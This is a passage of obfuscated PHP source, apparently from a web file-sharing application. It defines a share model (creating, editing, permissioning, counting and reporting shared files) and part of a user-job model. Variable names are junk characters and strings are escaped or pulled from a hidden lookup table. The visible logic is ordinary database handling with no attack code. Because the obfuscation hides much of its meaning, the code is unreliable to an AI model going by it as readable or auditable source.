$ÕÙ¡Ô‡[$¤¦û½ò„[1901]] = $this->getSort(); return parent::insert($ÕÙ¡Ô‡); } private function getSort() { $¨Øİæ‹ =& $_SERVER[…É¦À–]; $ù€•¨ì = parent::listData(); $±„ËŒ¤° = array_to_keyvalue($ù€•¨ì, $¨Øİæ‹[12], $¨Øİæ‹[1901]); return empty($±„ËŒ¤°) ? 0 : max($±„ËŒ¤°) + 1; } public function update($óø´ş¥¤, $÷çÄôŒœ) { $¸–˜ëñŒ =& $_SERVER[…É¦À–]; $ğ¹˜…à = parent::listData($óø´ş¥¤); $ü‡ÎÖëÅ = $this->findByName($÷çÄôŒœ[$¸–˜ëñŒ[32]]); if (!$ğ¹˜…à || $ü‡ÎÖëÅ && $ü‡ÎÖëÅ[$¸–˜ëñŒ[428]] != $ğ¹˜…à[$¸–˜ëñŒ[428]]) { return !1; } return parent::update($óø´ş¥¤, $÷çÄôŒœ); } public function setUserJob($ µñäÉ£, $ßä­ş±î) { $æã¶¼ê =& $_SERVER[…É¦À–]; if (!is_array($ßä­ş±î)) { $ßä­ş±î = array($ßä­ş±î); } $•ªÉë¡ = parent::listData(); $µóÖ‹¶Ô = array_to_keyvalue($•ªÉë¡, $æã¶¼ê[32]); $ËĞÆ™ÈÖ = $æã¶¼ê[407]; foreach ($ßä­ş±î as $±˜üÜ) { if ($µóÖ‹¶Ô[$±˜üÜ]) { $ËĞÆ™ÈÖ .= $µóÖ‹¶Ô[$±˜üÜ][$æã¶¼ê[428]] . $æã¶¼ê[50]; } else { $ğî¶ = $this->add($±˜üÜ); $ËĞÆ™ÈÖ .= $ğî¶ . $æã¶¼ê[50]; } } $ËĞÆ™ÈÖ = rtrim($ËĞÆ™ÈÖ, $æã¶¼ê[50]); Model($æã¶¼ê[554])->metaSet($ µñäÉ£, self::JOB_KEY, $ËĞÆ™ÈÖ); } public function getUserJob($ Ê½·Âı) { $Üüäùú¹ = Model($_SERVER[…É¦À–][554])->metaGet($ Ê½·Âı); return $this->getUserJobInfo($Üüäùú¹[self::JOB_KEY]); } public function getUserJobInfo($›¥¼ÒŞ‹) { $Ğò…È =& $_SERVER[…É¦À–]; $Œİ¹ÕÆ = explode($Ğò…È[50], $›¥¼ÒŞ‹); $‰¿è¡ê = parent::listData(); $‰¿è¡ê = array_remove_key($‰¿è¡ê, $Ğò…È[201]); $Ë¨»Â½Ë = array(); foreach ($Œİ¹ÕÆ as $â–·â) { if (isset($‰¿è¡ê[$â–·â])) { $Ë¨»Â½Ë[] = $‰¿è¡ê[$â–·â]; } } return $Ë¨»Â½Ë; } } goto a‡„ŒÌ’»; A÷‡ÑçÉÙ‹: class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\x65"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\x54\151\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\145\162\x74\54\165\x70\144\x61\164\x65", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\x63\x72\x65\141\164\x65\124\x69\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\156\143\164\x69\157\x6e"), array("\x6f\x70\164\151\x6f\156\163", '', "\x69\156\163\x65\x72\164\54\165\x70\144\x61\164\x65\54\163\145\x6c\x65\143\x74", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($™ˆ›âî) { $¢Í»ÑÑ  =& $_SERVER[…É¦À–]; $¢õèÌ© = isset($™ˆ›âî[0]) ? $™ˆ›âî[0] : !1; return array($¢Í»ÑÑ [2016] => array(USER_ID, $¢Í»ÑÑ [2017]), $¢Í»ÑÑ [1957] => array($¢õèÌ©, $¢Í»ÑÑ [2018])); } protected function listSimple() { $¿¡™ó“İ = array($_SERVER[…É¦À–][1687] => USER_ID); $¡©ÇµÅ­ = $this->field($this->fieldList)->where($¿¡™ó“İ)->select(); return $¡©ÇµÅ­ ? $¡©ÇµÅ­ : array(); } protected function getInfo($²ØĞ”½Å, $†ÕŸ‡Ç = false) { $È™ïšóñ =& $_SERVER[…É¦À–]; if ($†ÕŸ‡Ç) { return $this->_getShareInfo(array($È™ïšóñ[622] => $²ØĞ”½Å)); } $ã£ˆ‘° = $this->cacheFunctionGet($È™ïšóñ[1959], $²ØĞ”½Å); return $ã£ˆ‘°; } public function getInfoByHash($„Ãà´¼“) { return $this->_getShareInfo(array($_SERVER[…É¦À–][2019] => $„Ãà´¼“)); } public function getInfoByPath($…€á¡²¯) { $˜£‚²Ûê =& $_SERVER[…É¦À–]; $ş°°şã¡ = array($˜£‚²Ûê[1687] => USER_ID, $˜£‚²Ûê[431] => $…€á¡²¯); return $this->_getShareInfo($ş°°şã¡); } public function getInfoBySourcePath($í¿åƒ Ç) { $æÌ××­¯ =& $_SERVER[…É¦À–]; $ø¢¥¦òş = array($æÌ××­¯[1687] => USER_ID, $æÌ××­¯[1220] => $í¿åƒ Ç); return $this->_getShareInfo($ø¢¥¦òş); } private function _getShareInfo($„ŒËâé) { $´šìŠƒ =& $_SERVER[…É¦À–]; $Ğ‰ÙîŠÃ = $this->where($„ŒËâé)->find(); if (!$Ğ‰ÙîŠÃ) { return !1; } $„ŒËâé = array($´šìŠƒ[622] => $Ğ‰ÙîŠÃ[$´šìŠƒ[622]]); $©¡ãŸš¸ = $´šìŠƒ[2020]; $ê†ì¦Ê¿ = Model($´šìŠƒ[623])->order($´šìŠƒ[428])->field($©¡ãŸš¸)->where($„ŒËâé)->select(); if ($Ğ‰ÙîŠÃ[$´šìŠƒ[431]] == $´šìŠƒ[198]) { $Ğ‰ÙîŠÃ[$´šìŠƒ[87]] = IO::info($Ğ‰ÙîŠÃ[$´šìŠƒ[1220]]); } else { $Ğ‰ÙîŠÃ[$´šìŠƒ[87]] = Model($´šìŠƒ[1378])->pathInfo($Ğ‰ÙîŠÃ[$´šìŠƒ[431]]); } $Ğ‰ÙîŠÃ[$´šìŠƒ[2021]] = $ê†ì¦Ê¿; return $Ğ‰ÙîŠÃ; } protected function getInfoAuth($–‹ä¿—ç) { $˜·€¿›¯ =& $_SERVER[…É¦À–]; $ü¡»ËÁØ = $this->getInfo($–‹ä¿—ç); if ($ü¡»ËÁØ[$˜·€¿›¯[1687]] == USER_ID) { $ü¡»ËÁØ[$˜·€¿›¯[442]] = $ü¡»ËÁØ[$˜·€¿›¯[87]][$˜·€¿›¯[442]]; } else { $ü¡»ËÁØ[$˜·€¿›¯[442]] = Model($˜·€¿›¯[522])->authMake($ü¡»ËÁØ[$˜·€¿›¯[2021]]); } return $ü¡»ËÁØ; } protected function listData($«Õ¯·ñ = null, $©Ôëó·ç = 300) { $ğ±øÆœü =& $_SERVER[…É¦À–]; $Î´ÒÔ²ë = array(array($ğ±øÆœü[517] => array($ğ±øÆœü[1057], 0), $ğ±øÆœü[620] => array($ğ±øÆœü[1057], 0), $ğ±øÆœü[2022] => $ğ±øÆœü[1975])); if ($«Õ¯·ñ == $ğ±øÆœü[2023]) { $Î´ÒÔ²ë = array($ğ±øÆœü[517] => 1); } else { if ($«Õ¯·ñ == $ğ±øÆœü[1206]) { $Î´ÒÔ²ë = array($ğ±øÆœü[620] => 1); } } $Î´ÒÔ²ë[$ğ±øÆœü[1687]] = USER_ID; $ö¬ÃÂ“ = $this->where($Î´ÒÔ²ë)->selectPage($©Ôëó·ç); return $ö¬ÃÂ“; } protected function listToMe($Òç°ğä = 300) { $Ï«§òÁ =& $_SERVER[…É¦À–]; $áæ²­âè = Model($Ï«§òÁ[2024])->userGroupParents(USER_ID); $Œ¸ÚÊ• = array($Ï«§òÁ[605] => SourceModel::TYPE_USER, $Ï«§òÁ[525] => USER_ID); if ($áæ²­âè) { $Œ¸ÚÊ• = array(array($Ï«§òÁ[605] => SourceModel::TYPE_USER, $Ï«§òÁ[525] => USER_ID), array($Ï«§òÁ[605] => SourceModel::TYPE_GROUP, $Ï«§òÁ[525] => array($Ï«§òÁ[7], $áæ²­âè)), $Ï«§òÁ[2022] => $Ï«§òÁ[1975]); } $ù†Ø›ìï = Model($Ï«§òÁ[623])->where($Œ¸ÚÊ•)->selectPage($Òç°ğä); $ÈØáËÉ¢ = array_to_keyvalue_group($ù†Ø›ìï[$Ï«§òÁ[398]], $Ï«§òÁ[622]); if (!$ÈØáËÉ¢) { return $ù†Ø›ìï; } $úêÂ˜½ù = $Ï«§òÁ[2025]; $Œ¸ÚÊ• = array($Ï«§òÁ[622] => array($Ï«§òÁ[447], array_keys($ÈØáËÉ¢)), $Ï«§òÁ[1687] => array($Ï«§òÁ[1059], $Ï«§òÁ[198])); $šª—Š¾¿ = $this->field($úêÂ˜½ù)->where($Œ¸ÚÊ•)->select(); foreach ($šª—Š¾¿ as $öÜå±³ => &$™Ö˜ò™³) { $™Ö˜ò™³[$Ï«§òÁ[2021]] = $ÈØáËÉ¢[$™Ö˜ò™³[$Ï«§òÁ[622]]]; } unset($™Ö˜ò™³); $¶‡¥Î”ğ = array($Ï«§òÁ[2026] => $šª—Š¾¿, $Ï«§òÁ[2027] => $ù†Ø›ìï[$Ï«§òÁ[395]]); return $¶‡¥Î”ğ; } protected function shareAdd($òàñ‰ÂÙ, $ëşúÉô°) { $¨ÜõÁÏ— =& $_SERVER[…É¦À–]; $¾ôøÀ°‹ = $this->_addShareData($òàñ‰ÂÙ, $ëşúÉô°); if (!empty($ëşúÉô°[$¨ÜõÁÏ—[2028]])) { $this->_shareAuthSet($¾ôøÀ°‹, $ëşúÉô°[$¨ÜõÁÏ—[2028]]); } $this->shareEventAdd($òàñ‰ÂÙ, $ëşúÉô°, $¨ÜõÁÏ—[2029]); return $¾ôøÀ°‹; } protected function shareAddSystem($…ˆ»Ü°í, $ıÁ¹Ôï¨) { $äÙÓæİ° =& $_SERVER[…É¦À–]; $ß•…÷Ê = $this->_addShareData($…ˆ»Ü°í, $ıÁ¹Ôï¨, $äÙÓæİ°[1332]); $this->_shareAuthSet($ß•…÷Ê, $ıÁ¹Ôï¨[$äÙÓæİ°[2028]]); return $ß•…÷Ê; } private function shareEventAdd($ù±ºúÊ¿, $Ïå•—¥Ğ, $Úµ©™‚´ = "\x61\144\144") { $Ø‡ÏÁ¸­ =& $_SERVER[…É¦À–]; if (!$ù±ºúÊ¿ || $ù±ºúÊ¿ == $Ø‡ÏÁ¸­[198]) { return; } if ($Úµ©™‚´ == $Ø‡ÏÁ¸­[2029]) { if ($Ïå•—¥Ğ[$Ø‡ÏÁ¸­[517]] == $Ø‡ÏÁ¸­[88]) { Model($Ø‡ÏÁ¸­[590])->eventShare($ù±ºúÊ¿, $Ø‡ÏÁ¸­[2030]); } if ($Ïå•—¥Ğ[$Ø‡ÏÁ¸­[620]] == $Ø‡ÏÁ¸­[88]) { Model($Ø‡ÏÁ¸­[590])->eventShare($ù±ºúÊ¿, $Ø‡ÏÁ¸­[2031]); } return; } $Øõµ¥Ù = $this->getInfoByPath($ù±ºúÊ¿); $ÉÒ±ç = $Ø‡ÏÁ¸­[2032]; if ($Øõµ¥Ù[$Ø‡ÏÁ¸­[517]] == $Ø‡ÏÁ¸­[198] && $Ïå•—¥Ğ[$Ø‡ÏÁ¸­[517]] == $Ø‡ÏÁ¸­[88]) { $ÉÒ±ç = $Ø‡ÏÁ¸­[2030]; } if ($Øõµ¥Ù[$Ø‡ÏÁ¸­[517]] == $Ø‡ÏÁ¸­[88] && $Ïå•—¥Ğ[$Ø‡ÏÁ¸­[517]] == $Ø‡ÏÁ¸­[198]) { $ÉÒ±ç = $Ø‡ÏÁ¸­[2033]; } if ($Øõµ¥Ù[$Ø‡ÏÁ¸­[620]] == $Ø‡ÏÁ¸­[198] && $Ïå•—¥Ğ[$Ø‡ÏÁ¸­[620]] == $Ø‡ÏÁ¸­[88]) { $ÉÒ±ç = $Ø‡ÏÁ¸­[2031]; } if ($Øõµ¥Ù[$Ø‡ÏÁ¸­[620]] == $Ø‡ÏÁ¸­[88] && $Ïå•—¥Ğ[$Ø‡ÏÁ¸­[620]] == $Ø‡ÏÁ¸­[198]) { $ÉÒ±ç = $Ø‡ÏÁ¸­[2034]; } Model($Ø‡ÏÁ¸­[590])->eventShare($ù±ºúÊ¿, $ÉÒ±ç); return; } private function _addShareData($‚ø÷Ÿ¨, $ı£Åá× = array(), $ô¼ùÜ«ƒ = false) { $Ôë·İÀ =& $_SERVER[…É¦À–]; $¦ŠëŞÎø = $ô¼ùÜ«ƒ == $Ôë·İÀ[1332] ? 0 : USER_ID; $£“ƒÍĞè = array($Ôë·İÀ[446] => $‚ø÷Ÿ¨, $Ôë·İÀ[1678] => $¦ŠëŞÎø); if ($‚ø÷Ÿ¨ == 0) { $£“ƒÍĞè = array($Ôë·İÀ[2035] => $ı£Åá×[$Ôë·İÀ[1220]], $Ôë·İÀ[1678] => $¦ŠëŞÎø); } if ($úÊçË°Ô = $this->where($£“ƒÍĞè)->find()) { return $úÊçË°Ô[$Ôë·İÀ[622]]; } if ($‚ø÷Ÿ¨ == 0) { $½ÂÊ¤î‚ = array($Ôë·İÀ[32] => get_path_this($ı£Åá×[$Ôë·İÀ[84]])); } else { $½ÂÊ¤î‚ = Model($Ôë·İÀ[865])->sourceInfo($‚ø÷Ÿ¨); if (!$½ÂÊ¤î‚) { return !1; } } if (!$ı£Åá×[$Ôë·İÀ[1584]]) { $ı£Åá×[$Ôë·İÀ[1584]] = $½ÂÊ¤î‚[$Ôë·İÀ[32]]; } $†±üÀş£ = array($Ôë·İÀ[1678] => $¦ŠëŞÎø, $Ôë·İÀ[446] => $‚ø÷Ÿ¨, $Ôë·İÀ[1584] => $Ôë·İÀ[12], $Ôë·İÀ[517] => 0, $Ôë·İÀ[620] => 0, $Ôë·İÀ[1220] => $Ôë·İÀ[12], $Ôë·İÀ[336] => $Ôë·İÀ[12], $Ôë·İÀ[934] => $Ôë·İÀ[12], $Ôë·İÀ[2036] => 0, $Ôë·İÀ[2037] => 0, $Ôë·İÀ[801] => 0, $Ôë·İÀ[2038] => $Ôë·İÀ[12], $Ôë·İÀ[2019] => $Ôë·İÀ[12]); $º¸Ü·ÔÉ = explode($Ôë·İÀ[50], $Ôë·İÀ[2039]); foreach ($º¸Ü·ÔÉ as $È¹åòâ) { if (!isset($ı£Åá×[$È¹åòâ])) { continue; } $†±üÀş£[$È¹åòâ] = $ı£Åá×[$È¹åòâ]; } $Õ»­ûÔ‡ = $this->add($†±üÀş£); $‘ÌÒ‘ô’ = array($Ôë·İÀ[2019] => short_id($Õ»­ûÔ‡)); $this->where(array($Ôë·İÀ[2040] => $Õ»­ûÔ‡))->save($‘ÌÒ‘ô’); return $Õ»­ûÔ‡; } private function _shareAuthSet($Æ·¹çŒ«, $ÈÅçÈ) { $ë­†Ğò× =& $_SERVER[…É¦À–]; if (!is_array($ÈÅçÈ)) { return !1; } $Í˜ª›¬Ñ = Model($ë­†Ğò×[1985]); $Í˜ª›¬Ñ->where(array($ë­†Ğò×[622] => $Æ·¹çŒ«))->delete(); $İ—ê’™© = array(); foreach ($ÈÅçÈ as $Ş‹—íô) { $õõ½Ê«À = SourceModel::TYPE_USER; if ($Ş‹—íô[$ë­†Ğò×[440]] == SourceModel::TYPE_GROUP) { $õõ½Ê«À = SourceModel::TYPE_GROUP; } $Š°º€ªŒ = array($ë­†Ğò×[622] => $Æ·¹çŒ«, $ë­†Ğò×[440] => $õõ½Ê«À, $ë­†Ğò×[525] => intval($Ş‹—íô[$ë­†Ğò×[525]]), $ë­†Ğò×[1981] => 0, $ë­†Ğò×[2041] => -1); if ($Ş‹—íô[$ë­†Ğò×[1981]]) { $Š°º€ªŒ[$ë­†Ğò×[1981]] = $Ş‹—íô[$ë­†Ğò×[1981]]; } else { if ($Ş‹—íô[$ë­†Ğò×[2041]]) { $Š°º€ªŒ[$ë­†Ğò×[2041]] = $Ş‹—íô[$ë­†Ğò×[2041]]; } } $İ—ê’™©[] = $Š°º€ªŒ; } return $Í˜ª›¬Ñ->addAll($İ—ê’™©, array(), !0); } public function numViewAdd($¨«ÄŒƒØ) { $£ÜÅ§·¡ =& $_SERVER[…É¦À–]; $‘çÙ™÷Ú = array($£ÜÅ§·¡[2040] => $¨«ÄŒƒØ); $this->where($‘çÙ™÷Ú)->setAdd($£ÜÅ§·¡[2036]); } public function numDownloadAdd($ÈÃ¿”³Á) { $§˜ô€ûÖ =& $_SERVER[…É¦À–]; $û÷«²ŠÒ = array($§˜ô€ûÖ[2040] => $ÈÃ¿”³Á); $this->where($û÷«²ŠÒ)->setAdd($§˜ô€ûÖ[2037]); } protected function shareEdit($¶œ—ÉŞ–, $˜×ªÂÎ•) { $¶ƒâÍÖ‹ =& $_SERVER[…É¦À–]; $ó§¯‹Ó = $this->getInfo($¶œ—ÉŞ–); if (!$ó§¯‹Ó) { return !1; } $this->_checkLinkShare($˜×ªÂÎ•, $ó§¯‹Ó); $èŸ¾ãÛë = array(); $ŒšŠæ… = explode($¶ƒâÍÖ‹[50], $¶ƒâÍÖ‹[2042]); foreach ($ŒšŠæ… as $œñŠŠ¢¼) { if (!array_key_exists($œñŠŠ¢¼, $˜×ªÂÎ•)) { continue; } $èŸ¾ãÛë[$œñŠŠ¢¼] = $˜×ªÂÎ•[$œñŠŠ¢¼]; } $this->shareEventAdd($ó§¯‹Ó[$¶ƒâÍÖ‹[431]], $˜×ªÂÎ•, $¶ƒâÍÖ‹[1847]); $this->where(array($¶ƒâÍÖ‹[2040] => $¶œ—ÉŞ–))->save($èŸ¾ãÛë); if (isset($˜×ªÂÎ•[$¶ƒâÍÖ‹[2028]])) { $this->_shareAuthSet($¶œ—ÉŞ–, $˜×ªÂÎ•[$¶ƒâÍÖ‹[2028]]); } return !0; } private function _checkLinkShare($²ìÊ¨Æß, $Ùˆ¿¯èÆ) { $ö‡°ØñÆ =& $_SERVER[…É¦À–]; if ($²ìÊ¨Æß[$ö‡°ØñÆ[517]] != $ö‡°ØñÆ[88]) { return; } $ªÖÇîÀÄ = $Ùˆ¿¯èÆ[$ö‡°ØñÆ[87]][$ö‡°ØñÆ[431]]; if ($Ùˆ¿¯èÆ[$ö‡°ØñÆ[87]][$ö‡°ØñÆ[33]] != $ö‡°ØñÆ[200]) { $¬ğ¯‡»Ş = $this->_folderReport($ªÖÇîÀÄ); if (!$¬ğ¯‡»Ş) { return; } show_json(LNG($ö‡°ØñÆ[2043]) . $ö‡°ØñÆ[2044] . $¬ğ¯‡»Ş, !1); } $ş‚Æ„Â™ = Model($ö‡°ØñÆ[865])->fileInfoGet($Ùˆ¿¯èÆ[$ö‡°ØñÆ[87]][$ö‡°ØñÆ[431]]); if (!$ş‚Æ„Â™) { return; } $ÅÕé©Ç = $this->shareFileMeta($ş‚Æ„Â™[$ö‡°ØñÆ[497]]); if (isset($ÅÕé©Ç[$ö‡°ØñÆ[403]]) && $ÅÕé©Ç[$ö‡°ØñÆ[403]] == $ö‡°ØñÆ[88]) { show_json(LNG($ö‡°ØñÆ[2045]), !1); } } private function _folderReport($ÔÉı‡‚–) { $òöì´é =& $_SERVER[…É¦À–]; $£Öëô¶ï = array($òöì´é[497] => array($òöì´é[1057], 0), $òöì´é[790] => 3); $©èœû‘À = Model($òöì´é[2046])->where($£Öëô¶ï)->field($òöì´é[497])->select(); if (!$©èœû‘À) { return !1; } $©èœû‘À = array_to_keyvalue($©èœû‘À, $òöì´é[12], $òöì´é[497]); $«èË¯İ¿ = $òöì´é[50] . $ÔÉı‡‚– . $òöì´é[50]; $£Öëô¶ï = array($òöì´é[497] => array($òöì´é[7], $©èœû‘À), $òöì´é[540] => array($òöì´é[412], "\x25{$«èË¯İ¿}\x25"), $òöì´é[460] => 0); $Ç‹İæ¥š = Model($òöì´é[865])->where($£Öëô¶ï)->field($òöì´é[2047])->find(); if (!$Ç‹İæ¥š) { return !1; } $¿í°¤¯® = substr($Ç‹İæ¥š[$òöì´é[540]], strpos($Ç‹İæ¥š[$òöì´é[540]], $«èË¯İ¿)); $£Öëô¶ï = array($òöì´é[431] => array($òöì´é[7], trim($¿í°¤¯®, $òöì´é[50]))); $ÑÙ˜ìÃ¥ = Model($òöì´é[865])->where($£Öëô¶ï)->field($òöì´é[32])->select(); $³²åí­‰ = array_to_keyvalue($ÑÙ˜ìÃ¥, $òöì´é[12], $òöì´é[32]); $³²åí­‰[] = $Ç‹İæ¥š[$òöì´é[32]]; return implode($òöì´é[8], $³²åí­‰); } protected function remove($®Ô¤¤½) { $·×­µ‰ =& $_SERVER[…É¦À–]; if (is_array($®Ô¤¤½)) { $®Ô¤¤½ = array($·×­µ‰[7], $®Ô¤¤½); } $¸€ƒşâ° = array($·×­µ‰[622] => $®Ô¤¤½); $”Æú¥í = $this->where($¸€ƒşâ°)->delete(); if ($”Æú¥í) { Model($·×­µ‰[623])->where(array($·×­µ‰[622] => $®Ô¤¤½))->delete(); } $÷ ç³¬ù = is_array($®Ô¤¤½) ? $®Ô¤¤½[1] : array($®Ô¤¤½); for ($€ê¬²  = 0; $€ê¬²  < count($÷ ç³¬ù); $€ê¬² ++) { $ˆ¢òñ‚ = $this->getInfo($÷ ç³¬ù[$€ê¬² ]); if ($ˆ¢òñ‚[$·×­µ‰[620]] == $·×­µ‰[88]) { Model($·×­µ‰[590])->eventShare($ˆ¢òñ‚[$·×­µ‰[431]], $·×­µ‰[2034]); } if ($ˆ¢òñ‚[$·×­µ‰[517]] == $·×­µ‰[88]) { Model($·×­µ‰[590])->eventShare($ˆ¢òñ‚[$·×­µ‰[431]], $·×­µ‰[2033]); } } return $”Æú¥í; } protected function removeBySource($•ùŞ”æ) { $£ÕœÍ =& $_SERVER[…É¦À–]; $—æ­œ = array($£ÕœÍ[446] => array($£ÕœÍ[447], $•ùŞ”æ)); $‰éıÍù• = $this->field($£ÕœÍ[622])->where($—æ­œ)->select(); $‰éıÍù• = array_to_keyvalue($‰éıÍù•, $£ÕœÍ[12], $£ÕœÍ[622]); if (!$‰éıÍù•) { return; } $—æ­œ = array($£ÕœÍ[2040] => array($£ÕœÍ[447], $‰éıÍù•)); $this->where($—æ­œ)->delete(); Model($£ÕœÍ[623])->where($—æ­œ)->delete(); } public function listAll($ç©“Ù…´) { $«ı•ğœ” =& $_SERVER[…É¦À–]; $æ¤·îœ’ = array(); if ($ç©“Ù…´[$«ı•ğœ”[1687]]) { $æ¤·îœ’[$«ı•ğœ”[1687]] = $ç©“Ù…´[$«ı•ğœ”[1687]]; } if ($ç©“Ù…´[$«ı•ğœ”[800]]) { $Îò¢åÃ  = $ç©“Ù…´[$«ı•ğœ”[801]] ? $ç©“Ù…´[$«ı•ğœ”[801]] : strtotime(date($«ı•ğœ”[2048])); $æ¤·îœ’[$«ı•ğœ”[201]] = array($«ı•ğœ”[362], array($ç©“Ù…´[$«ı•ğœ”[800]], $Îò¢åÃ )); } if ($ç©“Ù…´[$«ı•ğœ”[33]]) { $æ¤·îœ’[$ç©“Ù…´[$«ı•ğœ”[33]]] = 1; } else { $æ¤·îœ’[] = array($«ı•ğœ”[517] => array($«ı•ğœ”[1057], 0), $«ı•ğœ”[620] => array($«ı•ğœ”[1057], 0), $«ı•ğœ”[2022] => $«ı•ğœ”[1975]); } if ($ç©“Ù…´[$«ı•ğœ”[1971]]) { $æ¤·îœ’[] = array($«ı•ğœ”[2019] => $ç©“Ù…´[$«ı•ğœ”[1971]], $«ı•ğœ”[1584] => array($«ı•ğœ”[412], "\x25{$ç©“Ù…´[$«ı•ğœ”[1971]]}\45"), $«ı•ğœ”[2022] => $«ı•ğœ”[1975]); } $’ğìâëè = $this->_makeOrder()->where($æ¤·îœ’)->selectPage(20); if (empty($’ğìâëè[$«ı•ğœ”[398]])) { return array(); } $this->_listDataApply($’ğìâëè[$«ı•ğœ”[398]]); return $’ğìâëè; } public function listDataApply($ÃòÜÓÜ) { $this->_listDataApply($ÃòÜÓÜ); return $ÃòÜÓÜ; } private function _listDataApply(&$æ«Ì¹µ) { $ƒğ´ä  =& $_SERVER[…É¦À–]; $­Ò¿Ÿû• = array_to_keyvalue($æ«Ì¹µ, $ƒğ´ä [12], $ƒğ´ä [1687]); $Çˆ«µ­Í = Model($ƒğ´ä [554])->userListInfo(array_unique($­Ò¿Ÿû•)); $³ûÁë” = array_to_keyvalue($æ«Ì¹µ, $ƒğ´ä [12], $ƒğ´ä [431]); $¼½áœÚÊ = Model($ƒğ´ä [865])->sourceListInfo($³ûÁë”, !0); foreach ($æ«Ì¹µ as $ò¦ïº…‰ => &$­¬‡èùû) { $‚ÕÄ°›ã = $­¬‡èùû[$ƒğ´ä [1687]]; $­¬‡èùû[$ƒğ´ä [2049]] = $Çˆ«µ­Í[$‚ÕÄ°›ã] ? $Çˆ«µ­Í[$‚ÕÄ°›ã] : !1; $şÏğËü“ = $­¬‡èùû[$ƒğ´ä [431]]; $­¬‡èùû[$ƒğ´ä [87]] = $¼½áœÚÊ[$şÏğËü“] ? $¼½áœÚÊ[$şÏğËü“] : !1; if ($­¬‡èùû[$ƒğ´ä [87]][$ƒğ´ä [460]] == $ƒğ´ä [88]) { unset($æ«Ì¹µ[$ò¦ïº…‰]); } if ($­¬‡èùû[$ƒğ´ä [87]] != $ƒğ´ä [198] && !$­¬‡èùû[$ƒğ´ä [87]]) { unset($æ«Ì¹µ[$ò¦ïº…‰]); } } unset($­¬‡èùû); $æ«Ì¹µ = array_values($æ«Ì¹µ); } private function _makeOrder($öşùØ£ = '') { $“ôÛ™Î‹ =& $_SERVER[…É¦À–]; $üÊŒ…üÕ = array($“ôÛ™Î‹[201], $“ôÛ™Î‹[801], $“ôÛ™Î‹[2036], $“ôÛ™Î‹[2037]); $ÁÜÇø¢ = array($“ôÛ™Î‹[479] => $“ôÛ™Î‹[480], $“ôÛ™Î‹[481] => $“ôÛ™Î‹[482]); $ùœø•İ÷ = Input::get($“ôÛ™Î‹[486], $“ôÛ™Î‹[7], $“ôÛ™Î‹[452], $üÊŒ…üÕ); $¹ƒÔ²€ = Input::get($“ôÛ™Î‹[487], $“ôÛ™Î‹[7], $“ôÛ™Î‹[2050], array($“ôÛ™Î‹[1968], $“ôÛ™Î‹[481])); $¹ƒÔ²€ = $ÁÜÇø¢[$¹ƒÔ²€]; $öşùØ£ = $öşùØ£ . "{$ùœø•İ÷}\x20{$¹ƒÔ²€}"; return $this->order($öşùØ£); } public function reportAdd($Ö„´÷Ùö) { $‚ÁÍµ =& $_SERVER[…É¦À–]; $šœÑ×çÂ = array($‚ÁÍµ[622] => $Ö„´÷Ùö[$‚ÁÍµ[622]], $‚ÁÍµ[1687] => USER_ID); if (Model($‚ÁÍµ[2046])->where($šœÑ×çÂ)->find()) { return !1; } $¢´ÊÈÜÕ = array($‚ÁÍµ[622] => $Ö„´÷Ùö[$‚ÁÍµ[622]], $‚ÁÍµ[1584] => $Ö„´÷Ùö[$‚ÁÍµ[1584]], $‚ÁÍµ[431] => $Ö„´÷Ùö[$‚ÁÍµ[431]], $‚ÁÍµ[497] => $Ö„´÷Ùö[$‚ÁÍµ[497]], $‚ÁÍµ[1687] => USER_ID, $‚ÁÍµ[33] => $Ö„´÷Ùö[$‚ÁÍµ[33]], $‚ÁÍµ[482] => $Ö„´÷Ùö[$‚ÁÍµ[482]]); return Model($‚ÁÍµ[2046])->add($¢´ÊÈÜÕ); } public function reportList($‹¶Ì†ì‚) { $ö‘ôØ¾Ø =& $_SERVER[…É¦À–]; $‰û›ë¯œ = array(); if ($‹¶Ì†ì‚[$ö‘ôØ¾Ø[800]]) { $Âôçß¾ = $‹¶Ì†ì‚[$ö‘ôØ¾Ø[801]] ? $‹¶Ì†ì‚[$ö‘ôØ¾Ø[801]] : strtotime(date($ö‘ôØ¾Ø[2048])); $‰û›ë¯œ[$ö‘ôØ¾Ø[201]] = array($ö‘ôØ¾Ø[362], array($‹¶Ì†ì‚[$ö‘ôØ¾Ø[800]], $Âôçß¾)); } if (isset($‹¶Ì†ì‚[$ö‘ôØ¾Ø[33]]) && in_array($‹¶Ì†ì‚[$ö‘ôØ¾Ø[33]], array($ö‘ôØ¾Ø[88], $ö‘ôØ¾Ø[466], $ö‘ôØ¾Ø[2051], $ö‘ôØ¾Ø[2052], $ö‘ôØ¾Ø[2053]))) { $‰û›ë¯œ[$ö‘ôØ¾Ø[33]] = $‹¶Ì†ì‚[$ö‘ôØ¾Ø[33]]; } if (isset($‹¶Ì†ì‚[$ö‘ôØ¾Ø[790]]) && in_array($‹¶Ì†ì‚[$ö‘ôØ¾Ø[790]], array($ö‘ôØ¾Ø[198], $ö‘ôØ¾Ø[88], $ö‘ôØ¾Ø[466], $ö‘ôØ¾Ø[2051]))) { $‰û›ë¯œ[$ö‘ôØ¾Ø[790]] = $‹¶Ì†ì‚[$ö‘ôØ¾Ø[790]]; } $¹Áùì•ä = Input::get($ö‘ôØ¾Ø[487], $ö‘ôØ¾Ø[7], $ö‘ôØ¾Ø[2050], array($ö‘ôØ¾Ø[1968], $ö‘ôØ¾Ø[481])); $°â¾â«î = array($ö‘ôØ¾Ø[479] => $ö‘ôØ¾Ø[480], $ö‘ôØ¾Ø[481] => $ö‘ôØ¾Ø[482]); $û·µ—€² = $ö‘ôØ¾Ø[2054] . $°â¾â«î[$¹Áùì•ä]; $‹à¨Ø–í = Model($ö‘ôØ¾Ø[2046])->where($‰û›ë¯œ)->order($û·µ—€²)->selectPage(20); if (empty($‹à¨Ø–í[$ö‘ôØ¾Ø[398]])) { return array(); } $áÎóÑí = array_to_keyvalue_group($‹à¨Ø–í[$ö‘ôØ¾Ø[398]], $ö‘ôØ¾Ø[790], $ö‘ôØ¾Ø[622]); if (!empty($áÎóÑí[0])) { $‹¶Ì†ì‚ = $áÎóÑí[0]; $‰û›ë¯œ = array($ö‘ôØ¾Ø[622] => array($ö‘ôØ¾Ø[7], $‹¶Ì†ì‚)); $‰ò½«íÒ = 